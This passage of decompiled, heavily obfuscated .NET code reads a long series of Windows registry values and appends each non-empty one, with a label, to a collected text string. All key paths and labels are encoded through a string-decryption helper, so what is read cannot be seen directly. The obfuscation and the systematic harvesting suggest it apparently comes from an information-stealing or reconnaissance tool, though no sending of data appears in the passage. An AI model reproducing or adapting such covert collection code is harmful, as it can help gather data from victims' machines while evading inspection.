						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("sűɼ\u0361Ѩպٺݷ\u0872ॾ੮\u0b7d౮൭\u0e65ཥၥᅯት፻ᑈᕀᙑ\u1753ᡂᥐᩄ᭼᱐ᴸṒὀ\u2054ℼ≖⌸\u2453╳♳❦⡲⥵⩍⬨Ⱑⴾ⹑⽜べㅥ㉕㍤㑮㕥㙠㝪㡰㥧㩲"), GClass0.smethod_0("QŰɧͳ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4dfe;
						}
						goto IL_4e58;
						IL_4dfe:
						num = 424;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("^Ķɀ\u032eщթ٭ݸࡨ९ਜ਼\u0b3eఫഴ\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("sűɼ\u0361Ѩպٺݷ\u0872ॾ੮\u0b7d౮൭\u0e65ཥၥᅯት፻ᑈᕀᙑ\u1753ᡂᥐᩄ᭼᱐ᴸṒὀ\u2054ℼ≖⌸\u2453╳♳❦⡲⥵⩍⬨Ⱑⴾ⹑⽜べㅥ㉕㍤㑮㕥㙠㝪㡰㥧㩲"), GClass0.smethod_0("QŰɧͳ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4e58;
						IL_4e58:
						num = 426;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("sűɼ\u0361Ѩպٺݷ\u0872ॾ੮\u0b7d౮൭\u0e65ཥၥᅯት፻ᑈᕀᙑ\u1753ᡂᥐᩄ᭼᱐ᴸṒὀ\u2054ℼ≖⌸\u2453╳♳❦⡲⥵⩍⬨Ⱑⴾ⹑⽜べㅥ㉕㍤㑮㕥㙠㝪㡰㥧㩲"), GClass0.smethod_0("DũɨʹѢլٸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4e8b;
						}
						goto IL_4ee5;
						IL_4e8b:
						num = 427;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("^Ķɀ\u032eщթ٭ݸࡨ९ਜ਼\u0b3eఫഴ\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("sűɼ\u0361Ѩպٺݷ\u0872ॾ੮\u0b7d౮൭\u0e65ཥၥᅯት፻ᑈᕀᙑ\u1753ᡂᥐᩄ᭼᱐ᴸṒὀ\u2054ℼ≖⌸\u2453╳♳❦⡲⥵⩍⬨Ⱑⴾ⹑⽜べㅥ㉕㍤㑮㕥㙠㝪㡰㥧㩲"), GClass0.smethod_0("DũɨʹѢլٸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4ee5;
						IL_4ee5:
						num = 429;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("sűɼ\u0361Ѩպٺݷ\u0872ॾ੮\u0b7d౮൭\u0e65ཥၥᅯት፻ᑈᕀᙑ\u1753ᡂᥐᩄ᭼᱐ᴸṒὀ\u2054ℼ≖⌸\u2453╳♳❦⡲⥵⩍⬨Ⱑⴾ⹑⽜べㅥ㉕㍤㑮㕥㙠㝪㡰㥧㩲"), GClass0.smethod_0("[Ţɴ\u036cѥկ\u064cݮ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4f18;
						}
						goto IL_4f72;
						IL_4f18:
						num = 430;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("^Ķɀ\u032eщթ٭ݸࡨ९ਜ਼\u0b3eఫഴ\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("sűɼ\u0361Ѩպٺݷ\u0872ॾ੮\u0b7d౮൭\u0e65ཥၥᅯት፻ᑈᕀᙑ\u1753ᡂᥐᩄ᭼᱐ᴸṒὀ\u2054ℼ≖⌸\u2453╳♳❦⡲⥵⩍⬨Ⱑⴾ⹑⽜べㅥ㉕㍤㑮㕥㙠㝪㡰㥧㩲"), GClass0.smethod_0("[Ţɴ\u036cѥկ\u064cݮ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4f72;
						IL_4f72:
						num = 432;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑁᕋᙘ\u175cᡋᥛᩍ᭻ᱶᵊṓ\u1f46⁐ⅰ≕⍺⑭╩♀❋⡻⥫⩬⭾Ɫ\u2d7c\u2e7b⽽たㅰ㉷㍦㑭㕑㘴㜥㠺㥕㩝㭴㱣㵷㹍㽭䁤䅮"), GClass0.smethod_0("_Ůɸ\u0360ѩիوݰࡩॡ੧୳"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_4fa5;
						}
						goto IL_4fff;
						IL_4fa5:
						num = 433;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Eŵɡ\u0366Ѹդ٦ݡࡣ\u0941੪୭ౠ൫๛\u0f3e\u102bᄴሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑁᕋᙘ\u175cᡋᥛᩍ᭻ᱶᵊṓ\u1f46⁐ⅰ≕⍺⑭╩♀❋⡻⥫⩬⭾Ɫ\u2d7c\u2e7b⽽たㅰ㉷㍦㑭㕑㘴㜥㠺㥕㩝㭴㱣㵷㹍㽭䁤䅮"), GClass0.smethod_0("_Ůɸ\u0360ѩիوݰࡩॡ੧୳"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_4fff;
						IL_4fff:
						num = 435;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑔᕜᙍᝏᡖ᥄ᩐ᭨ᱣᵓṂὃ⁘⅏≟⍉⑷╯♇❋⡕⥟⩕⭐ⱊⵍ⹏⼀ぞㅰ㉼㍰㑢㕠㙼㝪㡋㤧㩉㭆㱶㵵㹸㽣䁻䅼䉬䍸䑢䕥䙧䜤䡋䥯䩦䭡䱭䵱乤"), GClass0.smethod_0("JŢɯ\u0364"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5032;
						}
						goto IL_508c;
						IL_5032:
						num = 436;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Oſɮ\u036fѬջ٫ݽ࠷\u0953\u0a7b୷ౡ൫\u0e61ཤၦᅡባጬᑊᕤᙨᝤ\u187e\u197c\u1a60᭶\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑔᕜᙍᝏᡖ᥄ᩐ᭨ᱣᵓṂὃ⁘⅏≟⍉⑷╯♇❋⡕⥟⩕⭐ⱊⵍ⹏⼀ぞㅰ㉼㍰㑢㕠㙼㝪㡋㤧㩉㭆㱶㵵㹸㽣䁻䅼䉬䍸䑢䕥䙧䜤䡋䥯䩦䭡䱭䵱乤"), GClass0.smethod_0("JŢɯ\u0364"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_508c;
						IL_508c:
						num = 438;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑔᕜᙍᝏᡖ᥄ᩐ᭨ᱣᵓṂὃ⁘⅏≟⍉⑷╯♇❋⡕⥟⩕⭐ⱊⵍ⹏⼀ぞㅰ㉼㍰㑢㕠㙼㝪㡋㤧㩉㭆㱶㵵㹸㽣䁻䅼䉬䍸䑢䕥䙧䜤䡋䥯䩦䭡䱭䵱乤"), GClass0.smethod_0("_Ůɸ\u0360ѩիوݰࡩॡ੧୳"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_50bf;
						}
						goto IL_5119;
						IL_50bf:
						num = 439;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Oſɮ\u036fѬջ٫ݽ࠷\u0953\u0a7b୷ౡ൫\u0e61ཤၦᅡባጬᑊᕤᙨᝤ\u187e\u197c\u1a60᭶\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑔᕜᙍᝏᡖ᥄ᩐ᭨ᱣᵓṂὃ⁘⅏≟⍉⑷╯♇❋⡕⥟⩕⭐ⱊⵍ⹏⼀ぞㅰ㉼㍰㑢㕠㙼㝪㡋㤧㩉㭆㱶㵵㹸㽣䁻䅼䉬䍸䑢䕥䙧䜤䡋䥯䩦䭡䱭䵱乤"), GClass0.smethod_0("_Ůɸ\u0360ѩիوݰࡩॡ੧୳"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5119;
						IL_5119:
						num = 441;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑔᕜᙍᝏᡖ᥄ᩐ᭨ᱣᵓṂὃ⁘⅏≟⍉⑷╯♇❋⡕⥟⩕⭐ⱊⵍ⹏⼀ぞㅰ㉼㍰㑢㕠㙼㝪㡋㤧㩉㭆㱶㵵㹸㽣䁻䅼䉬䍸䑢䕥䙧䜤䡋䥯䩦䭡䱭䵱乤"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_514c;
						}
						goto IL_51a6;
						IL_514c:
						num = 442;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Oſɮ\u036fѬջ٫ݽ࠷\u0953\u0a7b୷ౡ൫\u0e61ཤၦᅡባጬᑊᕤᙨᝤ\u187e\u197c\u1a60᭶\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("\aąȈ\u0315ДԆ؆܋ࠆऊਚଉ\u0c02\u0d01ฉ༉\u1071ᅻቡ፯ᑔᕜᙍᝏᡖ᥄ᩐ᭨ᱣᵓṂὃ⁘⅏≟⍉⑷╯♇❋⡕⥟⩕⭐ⱊⵍ⹏⼀ぞㅰ㉼㍰㑢㕠㙼㝪㡋㤧㩉㭆㱶㵵㹸㽣䁻䅼䉬䍸䑢䕥䙧䜤䡋䥯䩦䭡䱭䵱乤"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_51a6;
						IL_51a6:
						num = 444;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑄᕌᙝ\u175fᡆᥔᩀ᭸ᱳᵃṒὓ\u2068ⅿ≯⍹⑇╍♰❶⡳⥹⩢⭧ⰳⵙ\u2e74⽩こㄹ㉑㍞㑮㕭㙠㝻㡳㥴㩤㭰㱪㵭㹯"), GClass0.smethod_0("JŢɯ\u0364"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_51d9;
						}
						goto IL_5233;
						IL_51d9:
						num = 445;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Gŷɦ\u0367Ѥճ٣ݵࡓख़\u0a64\u0b62౯\u0d65\u0e7e\u0f7bဧᅍበ\u137dᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑄᕌᙝ\u175fᡆᥔᩀ᭸ᱳᵃṒὓ\u2068ⅿ≯⍹⑇╍♰❶⡳⥹⩢⭧ⰳⵙ\u2e74⽩こㄹ㉑㍞㑮㕭㙠㝻㡳㥴㩤㭰㱪㵭㹯"), GClass0.smethod_0("JŢɯ\u0364"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5233;
						IL_5233:
						num = 447;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑄᕌᙝ\u175fᡆᥔᩀ᭸ᱳᵃṒὓ\u2068ⅿ≯⍹⑇╍♰❶⡳⥹⩢⭧ⰳⵙ\u2e74⽩こㄹ㉑㍞㑮㕭㙠㝻㡳㥴㩤㭰㱪㵭㹯"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5266;
						}
						goto IL_52c0;
						IL_5266:
						num = 448;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Cųɢ\u0363Ѹկٿݩࡗढ़\u0a60୦\u0c63൩\u0e72\u0f77\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑄᕌᙝ\u175fᡆᥔᩀ᭸ᱳᵃṒὓ\u2068ⅿ≯⍹⑇╍♰❶⡳⥹⩢⭧ⰳⵙ\u2e74⽩こㄹ㉑㍞㑮㕭㙠㝻㡳㥴㩤㭰㱪㵭㹯"), GClass0.smethod_0("UŠɶ\u036aѣխ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_52c0;
						IL_52c0:
						num = 450;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑵᕿᙬᝠᡷᥧ\u1a71\u1b4f᱑ᵨṲὪ⁼⅁≥⍥②╕♘❨⡱⥠⩶⭇ⱔⵅ"), GClass0.smethod_0("SŌɛ\u0351яՊ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_52f3;
						}
						goto IL_534d;
						IL_52f3:
						num = 451;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("[ťɾ\u036dѵՂ\u0653\u0740࠸स\u0a3a")), Registry.GetValue(GClass0.smethod_0("fŦɩͲѵե٧ݤࡧ३\u0a7b୮\u0c63\u0d62\u0e68བၐᅘቀፈᑵᕿᙬᝠᡷᥧ\u1a71\u1b4f᱑ᵨṲὪ⁼⅁≥⍥②╕♘❨⡱⥠⩶⭇ⱔⵅ"), GClass0.smethod_0("SŌɛ\u0351яՊ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_534d;
						IL_534d:
						num = 453;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("eŧɮͳѶդ٨ݥࡤ२\u0a7c୯ౠ\u0d63๗བྷၓᅙቇፉᑶᕾᙣᝡᡴᥦ\u1a76\u1b4e᱔ᵾṛὫ\u206eⅤ≗⍚⑦╿♢❴⡖⥰⩱⭫ⱱ"), GClass0.smethod_0("Hŧɸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5380;
						}
						goto IL_53da;
						IL_5380:
						num = 454;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("]ţɼ\u036fѻ՛ٳݴ\u086cॴਸସ\u0c3a")), Registry.GetValue(GClass0.smethod_0("eŧɮͳѶդ٨ݥࡤ२\u0a7c୯ౠ\u0d63๗བྷၓᅙቇፉᑶᕾᙣᝡᡴᥦ\u1a76\u1b4e᱔ᵾṛὫ\u206eⅤ≗⍚⑦╿♢❴⡖⥰⩱⭫ⱱ"), GClass0.smethod_0("Hŧɸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_53da;
						IL_53da:
						num = 456;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("bŢɭ;ѹթ٫ݠࡣ७\u0a7f\u0b52\u0c5f൞๔དྷၔᅜቄፄᑹᕳᙠᝤᡳᥣ\u1a75᭓᱅ᵂṂὊ⁇⅀≔⍗⑃╖☶✳⠲⤹"), GClass0.smethod_0("gŬɦ\u0364"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_540d;
						}
						goto IL_5467;
						IL_540d:
						num = 457;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Lũɵ\u0339ѝաٹݹࡡ१\u0a7b\u0b7e౾യ\u0e5dརၯᅨቯ፻ᐨᔵᘶ᜵ᠼ\u1938ᨸ\u1b3a")), Registry.GetValue(GClass0.smethod_0("bŢɭ;ѹթ٫ݠࡣ७\u0a7f\u0b52\u0c5f൞๔དྷၔᅜቄፄᑹᕳᙠᝤᡳᥣ\u1a75᭓᱅ᵂṂὊ⁇⅀≔⍗⑃╖☶✳⠲⤹"), GClass0.smethod_0("gŬɦ\u0364"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5467;
						IL_5467:
						num = 459;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑄᕌᙝ\u175fᡆᥔᩀ᭸ᱱᵇṅἀ⁌Ⅺ≲⍮⑶┺♜❶⡣⥳⩧⭠Ⱳ\u2d7b\u2e7f⽽なㅠ㉹㍐㑙㕋㙟㝍㡉㥕㩍㭍㱆㵎㹅"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_549a;
						}
						goto IL_54f4;
						IL_549a:
						num = 460;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Lżɵ\u0375Ѹնٯ\u0737ࡅॼ੬ଳ\u0c5b൘๙༯ၜᅬቺ፮ᑤᕚᙠᝮᡣᥩ\u1a60\u1b38\u1c38ᴺ")), Registry.GetValue(GClass0.smethod_0("wŵɸ\u0365Ѥնٶݻ\u0876ॺ੪\u0b79\u0c72൱\u0e79\u0f79ၡᅫቱ\u137fᑄᕌᙝ\u175fᡆᥔᩀ᭸ᱱᵇṅἀ⁌Ⅺ≲⍮⑶┺♜❶⡣⥳⩧⭠Ⱳ\u2d7b\u2e7f⽽なㅠ㉹㍐㑙㕋㙟㝍㡉㥕㩍㭍㱆㵎㹅"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_54f4;
						IL_54f4:
						num = 462;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u001fĝȐ\u030dЌԞ؞ܓࠎ\u0902\u0a12\u0b01ఊഉก༁ဉᄃሙ\u1317ᐬᔤᘵ\u1737ᡞ᥌\u1a58᭠᱾ᵖṜὛ⁃⅄≚⍚\u245a║☑❱⡝⥚⩞⭰Ɱ\u2d6b⸉⽯てㅫ㉠㍷㑿㕱㙉㝏㡸㥫㩳㬼㱏㵵㹭㽹䁻䄶䉂䍵䑡䔲䘼䜰䡘䥯䩿䭠䱤䵸乭伨偂兢剬印呪啭噯"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5527;
						}
						goto IL_5581;
						IL_5527:
						num = 463;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("vŌɌ\u0345єՎؿ\u074a\u0872२\u0a7a୶హ൏\u0e76ཤ\u1035ᄹሳፅᑰᕢᙣᝡ\u187fᥨᨫ\u1b4fᱭᵡṳὯ\u206aⅪ∸⌸\u243a")), Registry.GetValue(GClass0.smethod_0("\u001fĝȐ\u030dЌԞ؞ܓࠎ\u0902\u0a12\u0b01ఊഉก༁ဉᄃሙ\u1317ᐬᔤᘵ\u1737ᡞ᥌\u1a58᭠᱾ᵖṜὛ⁃⅄≚⍚\u245a║☑❱⡝⥚⩞⭰Ɱ\u2d6b⸉⽯てㅫ㉠㍷㑿㕱㙉㝏㡸㥫㩳㬼㱏㵵㹭㽹䁻䄶䉂䍵䑡䔲䘼䜰䡘䥯䩿䭠䱤䵸乭伨偂兢剬印呪啭噯"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5581;
						IL_5581:
						num = 465;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑍᕇᙔᝨ\u187f\u196f\u1a79ᭇᱛᵭṹὥⁿⅉ≇⍺⑶┱♝❪⡧⥨⩾⬬ⱹ\u2d29\u2e58⽮ぴㅤ㉰㍦㑱㔠"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_55b4;
						}
						goto IL_560e;
						IL_55b4:
						num = 466;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Dſɱ\u0334ўշٸݵ\u087dऩ\u0a7eବ\u0c5b\u0d63\u0e7bཀྵ\u1073ᅣቶጥᐸᔸᘺ")), Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑍᕇᙔᝨ\u187f\u196f\u1a79ᭇᱛᵭṹὥⁿⅉ≇⍺⑶┱♝❪⡧⥨⩾⬬ⱹ\u2d29\u2e58⽮ぴㅤ㉰㍦㑱㔠"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_560e;
						IL_560e:
						num = 468;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("rŲɽ\u036eѩչٻݰ\u0873ॽ੯\u0b62౯൮\u0e64ར\u1064ᅬቴ፴ᑉᕃᙐ\u1754ᡃᥓᩅ\u1b43\u1c4bᵿṵὨ⁵ⅿ≬⍋⑅╜♘❖⡜⥅⨰⭇ⱛⵃ\u2e58⽎じㄩ㉁㍎㑏㕙㙏㝦㡻㥲"), GClass0.smethod_0("Oţɺ\u036bьգټݛࡐ\u094aਲ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_5641;
						}
						goto IL_569b;
						IL_5641:
						num = 469;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("GŚɞ\u0354ў՛خ\u0745\u0859\u0945ਫ਼\u0b4cౚധ๏ཌ၍ᄸሸጺ")), Registry.GetValue(GClass0.smethod_0("rŲɽ\u036eѩչٻݰ\u0873ॽ੯\u0b62౯൮\u0e64ར\u1064ᅬቴ፴ᑉᕃᙐ\u1754ᡃᥓᩅ\u1b43\u1c4bᵿṵὨ⁵ⅿ≬⍋⑅╜♘❖⡜⥅⨰⭇ⱛⵃ\u2e58⽎じㄩ㉁㍎㑏㕙㙏㝦㡻㥲"), GClass0.smethod_0("Oţɺ\u036bьգټݛࡐ\u094aਲ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_569b;
						IL_569b:
						num = 471;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\fĈȇ\u0318Пճٱݾ\u087dॷ\u0a65୴౹൴\u0e7e\u0f7cၺᅶቮ።ᑟᕉᙚ\u175aᡍᥙᩏ᭵ᱭᵋṃ\u1f46⁐⅑≍⍏⑉╼☾❜⡮⥯⩩⭅ⱕ\u2d76\u2e6e⽼でㅏ㈲㍂㑹㕢㘮㝎㡥㥿㩳㬩㰼㴧㹂㽠䁨䅶䉺䍤"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_56ce;
						}
						goto IL_5728;
						IL_56ce:
						num = 472;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Gźɿ\u0331ѓզٺݴ\u082c\u093fਪ\u0b4d౭൫\u0e73\u0f7dၡᄸሸጺ")), Registry.GetValue(GClass0.smethod_0("\fĈȇ\u0318Пճٱݾ\u087dॷ\u0a65୴౹൴\u0e7e\u0f7cၺᅶቮ።ᑟᕉᙚ\u175aᡍᥙᩏ᭵ᱭᵋṃ\u1f46⁐⅑≍⍏⑉╼☾❜⡮⥯⩩⭅ⱕ\u2d76\u2e6e⽼でㅏ㈲㍂㑹㕢㘮㝎㡥㥿㩳㬩㰼㴧㹂㽠䁨䅶䉺䍤"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_5728;
						IL_5728:
						num = 474;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("uŷɾ\u0363Ѧմٸݵ\u0874ॸ੬\u0b7f\u0c70൳\u0e67ཧ\u1063ᅩቷ፹ᑆᕎᙓᝑᡄᥖᩆ\u1b7eᱤᵌṺώ\u2069Ⅾ≴⍴⑰╻☷❗⡧⥠⩠⭎ⱜ\u2d71\u2e77⽧まㅐ㈫㍙㑠㕥㘧㝅㡬㥰㩺㬢㰵"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_575b;
						}
						goto IL_57b5;
						IL_575b:
						num = 475;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0(".Şɥ\u0366ЪՊ١ݳ\u087fथਰସసഺ")), Registry.GetValue(GClass0.smethod_0("uŷɾ\u0363Ѧմٸݵ\u0874ॸ੬\u0b7f\u0c70൳\u0e67ཧ\u1063ᅩቷ፹ᑆᕎᙓᝑᡄᥖᩆ\u1b7eᱤᵌṺώ\u2069Ⅾ≴⍴⑰╻☷❗⡧⥠⩠⭎ⱜ\u2d71\u2e77⽧まㅐ㈫㍙㑠㕥㘧㝅㡬㥰㩺㬢㰵"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_57b5;
						IL_57b5:
						num = 477;
